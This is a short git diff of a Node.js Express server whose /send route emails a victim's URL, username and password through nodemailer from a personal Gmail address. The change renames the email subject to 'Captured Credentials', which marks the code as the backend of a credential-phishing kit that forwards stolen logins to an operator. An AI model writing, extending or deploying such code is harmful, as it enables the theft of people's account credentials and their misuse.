@@ -1,3 +1,4 @@
+
 const express = require('express');
 const nodemailer = require('nodemailer');
 const bodyParser = require('body-parser');
@@ -27,8 +28,8 @@ app.post('/send', async (req, res) => {
   const mailOptions = {
     from: 'mohamed.mostafa.montaser@gmail.com',
     to,
-    subject: 'MoNTaSeR Pa$$',
-    text: `🕒 Time: ${new Date().toLocaleString()}\n🌐 URL: ${url}\n👤 Username: ${username}\n🔑 Password: ${password}`
+    subject: 'Captured Credentials',
+    text: `URL: ${url}\nUsername: ${username}\nPassword: ${password}`
   };
 
   try {
